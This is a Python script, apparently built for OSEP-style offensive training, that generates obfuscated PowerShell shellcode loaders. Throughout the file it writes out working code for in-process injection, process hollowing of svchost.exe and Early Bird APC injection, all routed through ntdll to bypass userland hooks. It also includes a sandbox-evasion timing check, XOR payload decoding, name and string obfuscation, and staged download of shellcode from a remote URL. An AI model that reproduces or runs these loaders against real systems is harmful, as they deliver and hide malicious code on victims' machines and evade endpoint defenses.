#!/usr/bin/env python3
"""
Generates PS1 loader scripts from modular building blocks.
All injection primitives use ntdll Nt* functions to bypass
userland hooks on kernel32.dll.

Techniques: local (NtAllocateVirtualMemory+NtCreateThreadEx), hollowing, apc (Early Bird)
Delivery:   staged (HTTP download) or embedded (placeholder byte array)
Encoding:   XOR with configurable key, or none
Evasion:    sandbox timing check,
            string splitting, variable/function name randomization
"""

import argparse
import random
import re
import string
import sys

# ---------------------------------------------------------------------------
# Obfuscation helpers
# ---------------------------------------------------------------------------


def _rname():
    first = random.choice(string.ascii_lowercase)
    rest = "".join(random.choices(string.ascii_letters + string.digits, k=5))
    return first + rest


def _split(s):
    if len(s) < 4:
        return [s]
    n = random.randint(2, min(3, len(s) - 1))
    cuts = sorted(random.sample(range(2, len(s)), n - 1))
    parts, prev = [], 0
    for c in cuts:
        parts.append(s[prev:c])
        prev = c
    parts.append(s[prev:])
    return parts


def _joined(s):
    parts = _split(s)
    return "(" + "+".join(f"'{p}'" for p in parts) + ")"


def obfuscate(script):
    # --- Phase 1: split API name strings ---

    # LookupFunc bare-word call arguments
    def _repl_lookup(m):
        return f"LookupFunc {_joined(m.group(1))} {_joined(m.group(2))}"

    script = re.sub(r"\bLookupFunc\s+([\w.]+)\s+(\w+)", _repl_lookup, script)

    # Quoted API / reflection strings
    for name in [
        "GetProcAddress",
        "GetModuleHandle",
        "CreateProcess",
        "ReflectedDelegate",
        "InMemoryModule",
        "MyDelegateType",
    ]:
        j = _joined(name)
        script = script.replace(f"'{name}'", j)
        script = script.replace(f'"{name}"', j)

    # --- Phase 2: randomize function names ---
    fn_map = {}
    for fn in ["LookupFunc", "getDelegateType"]:
        fn_map[fn] = _rname()

    for old, new in sorted(fn_map.items(), key=lambda x: len(x[0]), reverse=True):
        script = re.sub(r"\b" + re.escape(old) + r"\b", new, script)

    # --- Phase 3: randomize variable names ---
    var_names = [
        "NtProtectVirtualMemory",
        "NtAllocateVirtualMemory",
        "NtWriteVirtualMemory",
        "NtCreateThreadEx",
        "NtWaitForSingleObject",
        "NtReadVirtualMemory",
        "NtResumeThread",
        "NtClose",
        "NtQueryInformationProcess",
        "NtQueueApcThread",
        "processInformationType",
        "startupInformationType",
        "unsafeMethodsType",
        "nativeMethodsType",
        "processInformation",
        "startupInformation",
        "processBasicInformation",
        "addressOfEntryPoint",
        "ptrToImageBase",
        "pebBaseAddress",
        "entrypoint_rva",
        "targetBase64",
        "targetBase",
        "e_lfanew",
        "CreateProcess",
        "baseAddr",
        "regionSize",
        "remoteMem",
        "hThread",
        "hProcess",
        "funcAddr",
        "oldProt",
        "protAddr",
        "protSize",
        "peHeader",
        "addrBuf",
        "patch",
        "moduleName",
        "functionName",
        "assemblies",
        "delType",
        "assem",
        "buf",
        "cmd",
        "tmp",
    ]
    var_map = {v: _rname() for v in var_names}

    for old, new in sorted(var_map.items(), key=lambda x: len(x[0]), reverse=True):
        script = re.sub(r"\$" + re.escape(old) + r"(?![a-zA-Z0-9_])", "$" + new, script)

    return script


# ---------------------------------------------------------------------------
# Template blocks — all syscall wrappers go through ntdll.dll
# ---------------------------------------------------------------------------


def block_timing_check():
    return (
        "$t1 = [Environment]::TickCount\n"
        "[System.Threading.Thread]::Sleep(1500)\n"
        "if (([Environment]::TickCount - $t1) -lt 1400) { return }"
    )


def block_helpers():
    return r"""function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
    ).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp = @()
    $assem.GetMethods() | ForEach-Object { If($_.Name -eq "GetProcAddress") { $tmp += $_ } }
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.
        DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
            [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
        DefineDynamicModule('InMemoryModule', $false).
        DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',
            [System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public',
        [System.Reflection.CallingConventions]::Standard, $func).
        SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
        SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}"""


def block_payload(delivery, url, xor_key):
    if delivery == "staged":
        lines = f'[Byte[]] $buf = (iwr -UseBasicParsing "{url}").Content'
    else:
        lines = (
            "# TODO: Replace with shellcode bytes\n"
            "[Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0  # <-- PLACEHOLDER"
        )
    if xor_key is not None:
        lines += (
            f"\nfor ($i = 0; $i -lt $buf.Length; $i++) {{\n"
            f"    $buf[$i] = $buf[$i] -bxor 0x{xor_key:02X}\n"
            f"}}"
        )
    return lines


# -- Local injection (Nt*) -------------------------------------------------


def block_local_injection():
    return r"""$NtAllocateVirtualMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc ntdll.dll NtAllocateVirtualMemory),
    (getDelegateType @([IntPtr], [IntPtr].MakeByRefType(), [IntPtr], [IntPtr].MakeByRefType(), [UInt32], [UInt32]) ([Int]))
)
$NtWriteVirtualMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc ntdll.dll NtWriteVirtualMemory),
    (getDelegateType @([IntPtr], [IntPtr], [byte[]], [UInt32], [IntPtr]) ([Int]))
)
$NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc ntdll.dll NtCreateThreadEx),
    (getDelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Int]))
)
$NtWaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc ntdll.dll NtWaitForSingleObject),
    (getDelegateType @([IntPtr], [Bool], [IntPtr]) ([Int]))
)

$baseAddr = [IntPtr]::Zero
$regionSize = [IntPtr]::new($buf.Length)
$NtAllocateVirtualMemory.Invoke([IntPtr]::new(-1), [ref]$baseAddr, [IntPtr]::Zero, [ref]$regionSize, 0x3000, 0x40) > $null

$NtWriteVirtualMemory.Invoke([IntPtr]::new(-1), $baseAddr, $buf, [UInt32]$buf.Length, [IntPtr]::Zero) > $null
$buf = ''

$hThread = [IntPtr]::Zero
$NtCreateThreadEx.Invoke([ref]$hThread, 0x1FFFFF, [IntPtr]::Zero, [IntPtr]::new(-1), $baseAddr, [IntPtr]::Zero, 0, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero) > $null

$NtWaitForSingleObject.Invoke($hThread, $false, [IntPtr]::Zero) > $null"""


# -- Remote injection shared ------------------------------------------------


def block_process_types():
    return r"""$assemblies = [AppDomain]::CurrentDomain.GetAssemblies()
$unsafeMethodsType = $assemblies | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1] -eq 'System.dll' } | ForEach-Object { $_.GetType('Microsoft.Win32.UnsafeNativeMethods') }
$nativeMethodsType = $assemblies | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1] -eq 'System.dll' } | ForEach-Object { $_.GetType('Microsoft.Win32.NativeMethods') }
$startupInformationType = $assemblies | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1] -eq 'System.dll' } | ForEach-Object { $_.GetType('Microsoft.Win32.NativeMethods+STARTUPINFO') }
$processInformationType = $assemblies | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1] -eq 'System.dll' } | ForEach-Object { $_.GetType('Microsoft.Win32.SafeNativeMethods+PROCESS_INFORMATION') }

$startupInformation = $startupInformationType.GetConstructors().Invoke($null)
$processInformation = $processInformationType.GetConstructors().Invoke($null)
$CreateProcess = $nativeMethodsType.GetMethod("CreateProcess")"""


def block_create_process(target):
    return (
        f'$cmd = [System.Text.StringBuilder]::new("{target}")\n'
        "$CreateProcess.Invoke($null, @($null, $cmd, $null, $null, $false, "
        "0x4, [IntPtr]::Zero, $null, $startupInformation, $processInformation)) > $null\n\n"
        "$hThread = $processInformation.hThread\n"
        "$hProcess = $processInformation.hProcess"
    )


# -- Process hollowing (Nt*) ------------------------------------------------


def block_hollowing_delegates():
    return r"""$NtReadVirtualMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc ntdll.dll NtReadVirtualMemory),
    (getDelegateType @([IntPtr], [IntPtr], [byte[]], [UInt32], [IntPtr]) ([Int]))
)
$NtWriteVirtualMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc ntdll.dll NtWriteVirtualMemory),
    (getDelegateType @([IntPtr], [IntPtr], [byte[]], [UInt32], [IntPtr]) ([Int]))
)
$NtResumeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc ntdll.dll NtResumeThread),
    (getDelegateType @([IntPtr], [IntPtr]) ([Int]))
)
$NtClose = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc ntdll.dll NtClose),
    (getDelegateType @([IntPtr]) ([Int]))
)
$NtQueryInformationProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc ntdll.dll NtQueryInformationProcess),
    (getDelegateType @([IntPtr], [Int], [Byte[]], [UInt32], [UInt32]) ([Int]))
)"""


def block_hollowing_inject():
    return r"""$processBasicInformation = [System.Byte[]]::CreateInstance([System.Byte], 48)
$tmp = [UInt32]0
$NtQueryInformationProcess.Invoke($hProcess, 0, $processBasicInformation, $processBasicInformation.Length, $tmp) > $null
$pebBaseAddress = [BitConverter]::ToInt64($processBasicInformation, 8)
$ptrToImageBase = [IntPtr]($pebBaseAddress + 0x10)

[byte[]] $addrBuf = New-Object byte[] ([IntPtr]::Size)
$NtReadVirtualMemory.Invoke($hProcess, $ptrToImageBase, $addrBuf, [UInt32]$addrBuf.Length, [IntPtr]::Zero) > $null

$targetBase = [IntPtr]::Zero
if ([IntPtr]::Size -eq 8) {
    $targetBase = [IntPtr]::new([System.BitConverter]::ToInt64($addrBuf, [IntPtr]::Zero))
} else {
    $targetBase = [IntPtr]::new([System.BitConverter]::ToInt32($addrBuf, [IntPtr]::Zero))
}
$targetBase64 = [UInt64]$targetBase.ToInt64()

[byte[]] $peHeader = New-Object byte[] 0x200
$NtReadVirtualMemory.Invoke($hProcess, $targetBase, $peHeader, [UInt32]0x200, [IntPtr]::Zero) > $null

$e_lfanew = [BitConverter]::ToUInt32($peHeader, 0x3C)
$entrypoint_rva = [BitConverter]::ToUInt32($peHeader, [int]($e_lfanew + 0x28))
$addressOfEntryPoint = [IntPtr]::new($entrypoint_rva + $targetBase64)

$NtWriteVirtualMemory.Invoke($hProcess, $addressOfEntryPoint, $buf, [UInt32]$buf.Length, [IntPtr]::Zero) > $null
$buf = ''
$NtResumeThread.Invoke($hThread, [IntPtr]::Zero) > $null
$NtClose.Invoke($hProcess) > $null
$NtClose.Invoke($hThread) > $null"""


# -- APC injection / Early Bird (Nt*) --------------------------------------


def block_apc_delegates():
    return r"""$NtAllocateVirtualMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc ntdll.dll NtAllocateVirtualMemory),
    (getDelegateType @([IntPtr], [IntPtr].MakeByRefType(), [IntPtr], [IntPtr].MakeByRefType(), [UInt32], [UInt32]) ([Int]))
)
$NtWriteVirtualMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc ntdll.dll NtWriteVirtualMemory),
    (getDelegateType @([IntPtr], [IntPtr], [byte[]], [UInt32], [IntPtr]) ([Int]))
)
$NtQueueApcThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc ntdll.dll NtQueueApcThread),
    (getDelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Int]))
)
$NtResumeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc ntdll.dll NtResumeThread),
    (getDelegateType @([IntPtr], [IntPtr]) ([Int]))
)
$NtClose = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc ntdll.dll NtClose),
    (getDelegateType @([IntPtr]) ([Int]))
)"""


def block_apc_inject():
    return r"""$remoteMem = [IntPtr]::Zero
$regionSize = [IntPtr]::new($buf.Length)
$NtAllocateVirtualMemory.Invoke($hProcess, [ref]$remoteMem, [IntPtr]::Zero, [ref]$regionSize, 0x3000, 0x40) > $null

$NtWriteVirtualMemory.Invoke($hProcess, $remoteMem, $buf, [UInt32]$buf.Length, [IntPtr]::Zero) > $null
$buf = ''
$NtQueueApcThread.Invoke($hThread, $remoteMem, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero) > $null
$NtResumeThread.Invoke($hThread, [IntPtr]::Zero) > $null
$NtClose.Invoke($hProcess) > $null
$NtClose.Invoke($hThread) > $null"""


# ---------------------------------------------------------------------------
# Generator
# ---------------------------------------------------------------------------


def generate(args):
    sections = []

    if args.timing:
        sections.append(block_timing_check())

    sections.append(block_helpers())

    if args.technique in ("hollowing", "apc"):
        sections.append(block_process_types())
        if args.technique == "hollowing":
            sections.append(block_hollowing_delegates())
        else:
            sections.append(block_apc_delegates())
        sections.append(block_create_process(args.target))

    xor_key = int(args.xor_key, 16) if args.xor_key else None
    sections.append(block_payload(args.delivery, args.url, xor_key))

    if args.technique == "local":
        sections.append(block_local_injection())
    elif args.technique == "hollowing":
        sections.append(block_hollowing_inject())
    elif args.technique == "apc":
        sections.append(block_apc_inject())

    script = "\n\n".join(sections) + "\n"

    if args.obfuscate:
        script = obfuscate(script)

    return script


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------


def main():
    p = argparse.ArgumentParser(
        description="OSEP PowerShell Loader Generator (ntdll Nt* syscalls)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""\
Techniques:
  local      NtAllocateVirtualMemory + NtCreateThreadEx in current process
  hollowing  CreateProcess suspended → PEB walk → NtWriteVirtualMemory → NtResumeThread
  apc        CreateProcess suspended → NtAllocateVirtualMemory + NtQueueApcThread (Early Bird)

All injection primitives resolve through ntdll.dll, bypassing
userland hooks on kernel32.dll. CreateProcess uses .NET reflected NativeMethods.

Examples:
  %(prog)s -t local -d staged --url http://10.0.0.1/sc.bin --xor CA --timing
  %(prog)s -t hollowing -d staged --url http://10.0.0.1/sc.bin --timing --obfuscate
  %(prog)s -t apc -d embedded --timing --obfuscate
  %(prog)s -t local -d staged --url http://10.0.0.1/sc.bin --timing --obfuscate -o loader.ps1""",
    )

    p.add_argument(
        "-t",
        "--technique",
        choices=["local", "hollowing", "apc"],
        required=True,
        help="Injection technique",
    )
    p.add_argument(
        "-d",
        "--delivery",
        choices=["staged", "embedded"],
        required=True,
        help="Payload delivery (staged=HTTP download, embedded=inline placeholder)",
    )
    p.add_argument(
        "--url",
        default="http://CHANGEME/favicon.png",
        help="URL for staged delivery (default: placeholder)",
    )
    p.add_argument(
        "--xor",
        dest="xor_key",
        metavar="HEX",
        help="XOR decode key as hex byte (e.g. CA)",
    )
    p.add_argument(
        "--timing",
        action="store_true",
        help="Sandbox timing check (Sleep + TickCount delta)",
    )
    p.add_argument(
        "--obfuscate",
        action="store_true",
        help="Randomize variable/function names and split API strings",
    )
    p.add_argument(
        "--target",
        default="C:\\Windows\\System32\\svchost.exe",
        help="Target process for hollowing/apc (default: svchost.exe)",
    )
    p.add_argument(
        "-o",
        "--output",
        help="Output file (default: stdout)",
    )

    args = p.parse_args()

    if (
        args.technique == "local"
        and args.target != "C:\\Windows\\System32\\svchost.exe"
    ):
        p.error("--target only applies to hollowing/apc techniques")

    script = generate(args)

    if args.output:
        with open(args.output, "w") as f:
            f.write(script)
        print(f"[+] Written to {args.output}", file=sys.stderr)
    else:
        print(script)


if __name__ == "__main__":
    main()
